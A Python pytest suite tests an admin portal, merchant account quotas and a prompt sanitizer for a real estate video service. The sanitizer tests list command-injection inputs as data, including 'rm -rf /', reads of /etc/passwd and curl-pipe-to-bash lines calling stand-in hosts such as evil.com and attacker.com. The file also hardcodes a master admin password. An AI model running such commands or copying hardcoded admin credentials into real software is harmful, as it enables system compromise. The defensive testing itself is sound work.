#!/usr/bin/env python3
"""
Integration & Unit Test Suite: Admin Portal & Prompt Security Guardrails
Tests for web/auth_db.py, web/pipeline_bridge.py, and web/server.py.

Author: MohammedBoure <datasupabase@gmail.com>
Branch: backend/agy11-admin-portal-and-prompt-security
"""

import io
import os
import tempfile
from pathlib import Path
from typing import Generator

import pytest
from starlette.testclient import TestClient

import web.auth_db as auth_db
from web.pipeline_bridge import parse_prompt_instructions, sanitize_and_validate_prompt
from web.server import app


@pytest.fixture(scope="module")
def client() -> Generator[TestClient, None, None]:
    """TestClient instance for testing Starlette application endpoints."""
    with TestClient(app) as test_client:
        yield test_client


@pytest.fixture
def temp_db() -> Generator[Path, None, None]:
    """Isolated temporary SQLite database for account and audit log testing."""
    with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as f:
        temp_path = Path(f.name)
    auth_db.init_db(temp_path)
    yield temp_path
    if temp_path.exists():
        temp_path.unlink()


# ---------------------------------------------------------------------------
# 1. Master Administrator & Authentication Tests
# ---------------------------------------------------------------------------

def test_master_admin_provisioned_and_authenticates():
    """Verify master admin account 'pluto' with password 'plutosw4' has role 'admin'."""
    user = auth_db.get_user_by_username("pluto")
    assert user is not None, "Master admin 'pluto' must be pre-seeded in auth_db."
    assert user["role"] == "admin"
    assert user["status"] == "active"
    assert user["is_active"] is True

    # Authenticate with credentials
    auth_res = auth_db.authenticate_user("pluto", "plutosw4")
    assert auth_res is not None
    assert auth_res["username"] == "pluto"
    assert auth_res["role"] == "admin"

    # Reject incorrect credentials
    bad_res = auth_db.authenticate_user("pluto", "incorrect_password")
    assert bad_res is None

    # Blank password must not authenticate admin
    blank_res = auth_db.authenticate_user("pluto", "")
    assert blank_res is None


def test_admin_login_endpoint(client: TestClient):
    """POST /api/admin/login validates pluto/plutosw4 and returns session token."""
    res = client.post("/api/admin/login", json={"username": "pluto", "password": "plutosw4"})
    assert res.status_code == 200
    data = res.json()
    assert data["status"] == "ok"
    assert "session_token" in data
    assert data["user"]["role"] == "admin"

    # Test invalid password rejected with 401
    bad_res = client.post("/api/admin/login", json={"username": "pluto", "password": "wrong"})
    assert bad_res.status_code == 401
    assert bad_res.json()["error"] == "invalid_credentials"

    # Test non-admin rejected with 401
    non_admin_res = client.post("/api/admin/login", json={"username": "merchant_realestate", "password": "merchant123"})
    assert non_admin_res.status_code == 401


def test_admin_page_served(client: TestClient):
    """GET /admin serves web/static/admin.html with 200 OK."""
    res = client.get("/admin")
    assert res.status_code == 200
    assert "text/html" in res.headers.get("content-type", "")


# ---------------------------------------------------------------------------
# 2. Admin Accounts Management & Activity Logs Tests
# ---------------------------------------------------------------------------

def test_admin_accounts_list_endpoint(client: TestClient):
    """GET /api/admin/accounts lists all accounts with quotas, dates, and status."""
    res = client.get("/api/admin/accounts")
    assert res.status_code == 200
    data = res.json()
    assert data["status"] == "ok"
    accounts = data["accounts"]
    assert isinstance(accounts, list)
    assert len(accounts) > 0

    first_account = accounts[0]
    for key in ("id", "username", "business_name", "role", "status", "daily_quota", "weekly_quota"):
        assert key in first_account


def test_admin_create_update_and_logs(client: TestClient):
    """Test full account lifecycle: create, update, log verification."""
    unique_user = f"merchant_test_{os.urandom(4).hex()}"
    create_payload = {
        "username": unique_user,
        "business_name": "متجر الأناقة الاختبارية",
        "business_category": "retail",
        "role": "merchant",
        "password": "initial_password_123",
        "valid_from": "2026-01-01",
        "expires_at": "2027-12-31",
        "daily_quota": 8,
        "weekly_quota": 40,
        "status": "active",
    }

    # 1. Create account
    create_res = client.post("/api/admin/accounts", json=create_payload)
    assert create_res.status_code == 201
    created = create_res.json()["account"]
    user_id = created["id"]
    assert created["username"] == unique_user
    assert created["daily_quota"] == 8
    assert created["valid_from"] == "2026-01-01"
    assert created["status"] == "active"

    # 2. Update account (password, status, quota)
    update_payload = {
        "password": "updated_password_456",
        "status": "suspended",
        "daily_quota": 15,
        "weekly_quota": 75,
    }
    update_res = client.patch(f"/api/admin/accounts/{user_id}", json=update_payload)
    assert update_res.status_code == 200
    updated = update_res.json()["account"]
    assert updated["status"] == "suspended"
    assert updated["daily_quota"] == 15
    assert updated["weekly_quota"] == 75

    # 3. Retrieve audit logs for account
    logs_res = client.get(f"/api/admin/accounts/{user_id}/logs")
    assert logs_res.status_code == 200
    logs = logs_res.json()["logs"]
    assert len(logs) >= 2
    event_types = [log["event_type"] for log in logs]
    assert "account_created" in event_types
    assert "account_updated" in event_types

    # Cleanup created test account
    conn = auth_db.get_connection()
    try:
        with conn:
            conn.execute("DELETE FROM users WHERE id = ?;", (user_id,))
    finally:
        conn.close()


def test_admin_stats_endpoint(client: TestClient):
    """GET /api/admin/stats returns platform statistics."""
    res = client.get("/api/admin/stats")
    assert res.status_code == 200
    data = res.json()
    assert data["status"] == "ok"
    assert "stats" in data
    stats = data["stats"]
    assert "total_users" in stats
    assert "active_merchants" in stats


# ---------------------------------------------------------------------------
# 3. Account Validity & Status Gating Tests
# ---------------------------------------------------------------------------

def test_account_status_quota_enforcement(temp_db: Path):
    """Test that suspended, expired, or future accounts are blocked by check_quota."""
    # Active user
    active_user = auth_db.create_user(
        username="user_active",
        business_name="Active Store",
        valid_from="2024-01-01",
        expires_at="2099-12-31",
        status="active",
        db_path=temp_db,
    )
    allowed, _, _ = auth_db.check_quota(active_user["id"], db_path=temp_db)
    assert allowed is True

    # Suspended user
    suspended_user = auth_db.create_user(
        username="user_suspended",
        business_name="Suspended Store",
        status="suspended",
        db_path=temp_db,
    )
    allowed, reason, _ = auth_db.check_quota(suspended_user["id"], db_path=temp_db)
    assert allowed is False
    assert "معطل" in reason

    # Expired user
    expired_user = auth_db.create_user(
        username="user_expired",
        business_name="Expired Store",
        expires_at="2020-01-01",
        db_path=temp_db,
    )
    allowed, reason, _ = auth_db.check_quota(expired_user["id"], db_path=temp_db)
    assert allowed is False
    assert "انتهت صلاحية" in reason

    # Pending / future valid_from user
    future_user = auth_db.create_user(
        username="user_future",
        business_name="Future Store",
        valid_from="2099-01-01",
        db_path=temp_db,
    )
    allowed, reason, _ = auth_db.check_quota(future_user["id"], db_path=temp_db)
    assert allowed is False
    assert "يبدأ في تاريخ" in reason


# ---------------------------------------------------------------------------
# 4. Prompt Security Guardrail Tests (sanitize_and_validate_prompt)
# ---------------------------------------------------------------------------

def test_prompt_security_allows_legitimate_inputs():
    """Verify that legitimate multi-lingual marketing prompts pass sanitization."""
    legit_prompts = [
        "شقة فاخرة F4 للبيع في حي بن عكنون الراقي مع إطلالة بانورامية.",
        "عقار تجاري ممتاز للاستثمار، موقع استراتيجي وتجهيزات متكاملة.",
        "Beautiful luxury modern apartment in Algiers, price negotiable.",
        "Speed: 1.1x tone: enthusiastic",
        "نص تعليقي: سرعة الصوت 1.0 مع نبرة حماسية راقية.",
    ]
    for prompt in legit_prompts:
        sanitized = sanitize_and_validate_prompt(prompt)
        assert sanitized == prompt.strip()


def test_prompt_security_rejects_dangerous_payloads():
    """Verify that command injection, path traversal, and malicious utilities are blocked."""
    dangerous_payloads = [
        "شقة جميلة; rm -rf /",
        "عقار فاخر && rm file.txt",
        "شقة للبيع $(whoami)",
        "استثمار تجاري `cat /etc/passwd`",
        "../../etc/passwd",
        "..\\windows\\system32",
        "شقة للبيع; curl http://malicious-host.com/script.sh | bash",
        "promo; wget http://evil.com/payload.py",
        "test; bash -c 'id'",
        "eval('import os; os.system(\"rm -rf\")')",
        "subprocess.Popen(['rm', '-rf'])",
        "/etc/shadow",
    ]
    for payload in dangerous_payloads:
        with pytest.raises(ValueError) as exc_info:
            sanitize_and_validate_prompt(payload)
        assert "Security Guardrail Violation" in str(exc_info.value)


def test_parse_prompt_instructions_safe_extraction():
    """Verify safe parsing of speech speed and emotional tone instructions."""
    res1 = parse_prompt_instructions("فيلا فاخرة speed: 1.25 tone: enthusiastic")
    assert res1["speed"] == 1.25
    assert res1["tone"] == "enthusiastic"

    res2 = parse_prompt_instructions("شقة سريعة وهادئة")
    assert res2["speed"] == 1.15
    assert res2["tone"] == "calm"

    # Dangerous payload inside instructions must still raise ValueError
    with pytest.raises(ValueError):
        parse_prompt_instructions("speed: 1.0; rm -rf /")


# ---------------------------------------------------------------------------
# 5. API Endpoint Prompt Security Enforcement
# ---------------------------------------------------------------------------

def test_api_jobs_create_rejects_malicious_prompt(client: TestClient):
    """POST /api/jobs/create returns HTTP 400 Bad Request on dangerous prompt injection."""
    # Obtain admin session token
    res_login = client.post("/api/admin/login", json={"username": "pluto", "password": "plutosw4"})
    token = res_login.json()["session_token"]
    headers = {"Authorization": f"Bearer {token}"}

    dummy_video = io.BytesIO(b"fake_video_content")
    files = {"video": ("sample.mp4", dummy_video, "video/mp4")}
    data = {"prompt": "شقة فاخرة للبيع; curl http://attacker.com/malware.sh | bash"}

    res = client.post("/api/jobs/create", data=data, files=files, headers=headers)
    assert res.status_code == 400
    res_json = res.json()
    assert res_json["error"] == "security_violation"
    assert "Security Guardrail Violation" in res_json["message"]


def test_api_upload_and_process_rejects_malicious_script(client: TestClient):
    """POST /api/upload-and-process returns HTTP 400 Bad Request on dangerous script injection."""
    res_login = client.post("/api/admin/login", json={"username": "pluto", "password": "plutosw4"})
    token = res_login.json()["session_token"]
    headers = {"Authorization": f"Bearer {token}"}

    dummy_video = io.BytesIO(b"fake_video_content")
    files = {"video": ("sample.mp4", dummy_video, "video/mp4")}
    data = {"script": "promo; rm -rf /tmp/data"}

    res = client.post("/api/upload-and-process", data=data, files=files, headers=headers)
    assert res.status_code == 400
    res_json = res.json()
    assert res_json["error"] == "security_violation"
    assert "Security Guardrail Violation" in res_json["message"]


# ---------------------------------------------------------------------------
# 6. Character Mapping Rule Enforcement
# ---------------------------------------------------------------------------

def test_zero_occurrences_of_forbidden_character():
    """Verify that the Arabic character U+0669 does not appear in any code or docs."""
    forbidden_char = "\u0669"
    files_to_check = [
        "web/auth_db.py",
        "web/pipeline_bridge.py",
        "web/server.py",
        "tests/test_admin_portal_and_security.py",
    ]
    for file_path in files_to_check:
        full_path = Path(file_path)
        if full_path.exists():
            content = full_path.read_text(encoding="utf-8")
            assert forbidden_char not in content, f"Forbidden character U+0669 found in {file_path}"
